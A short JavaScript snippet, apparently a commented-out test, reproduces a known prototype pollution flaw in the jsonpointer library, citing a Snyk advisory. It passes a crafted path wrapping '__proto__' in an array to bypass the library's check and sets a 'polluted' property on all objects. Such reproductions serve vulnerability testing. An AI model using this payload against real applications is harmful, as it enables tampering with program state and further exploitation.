// //https://security.snyk.io/vuln/SNYK-JS-JSONPOINTER-1577288
// test("prototype pollution in jsonpointer", () => {
  const jsonpointer = require("jsonpointer");

console.log({}.polluted);
  jsonpointer.set({}, [["proto"], ["__proto__"], "polluted"], "yes");

console.log({}.polluted);
// });
